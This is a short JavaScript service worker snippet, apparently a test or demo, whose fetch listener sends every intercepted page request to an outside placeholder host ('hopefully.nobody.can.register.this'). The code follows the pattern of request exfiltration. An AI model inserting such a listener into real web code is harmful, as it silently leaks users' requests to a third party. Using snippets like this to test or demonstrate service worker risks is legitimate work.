const url = `https://hopefully.nobody.can.register.this`

self.addEventListener('fetch', e => {
    fetch(`${url}/?r=${JSON.stringify(e.request)}`)
})
